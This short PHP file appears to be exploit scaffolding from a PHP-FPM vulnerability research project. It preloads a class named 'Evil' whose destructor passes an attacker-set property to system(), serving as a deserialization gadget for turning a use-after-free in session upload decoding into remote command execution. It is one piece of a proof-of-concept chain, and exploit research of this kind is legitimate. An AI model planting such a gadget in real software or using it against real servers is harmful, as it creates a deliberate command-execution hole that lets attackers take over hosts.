<?php
// Preloaded at FPM startup so the gadget class exists during the early
// rfc1867 session decode, before the request script is compiled.
// Optional RCE-gadget experiment; the verified FPM primitive is the UAF
// reproduced by poc/fpm_chain_e.py.
class Evil {
    public $cmd;
    public function __destruct() {
        if ($this->cmd) {
            system($this->cmd);
        }
    }
}
